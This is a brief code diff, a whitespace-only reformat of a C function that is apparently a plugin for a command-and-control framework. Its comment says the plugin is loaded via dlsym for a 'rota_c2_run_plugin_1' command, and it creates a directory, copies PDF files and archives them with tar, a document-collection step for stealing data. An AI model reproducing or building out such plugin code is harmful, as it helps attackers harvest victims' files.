@@ -15,12 +15,11 @@ void tar() {
 
 }
 
-
 // this is loaded via dlsym.
 // the argument to the rota_c2_run_plugin_1 command
 extern void update(void) {
     create_dir();
     copy_pdfs();
-		sleep(10);
-		tar();
+    sleep(10);
+    tar();
 }
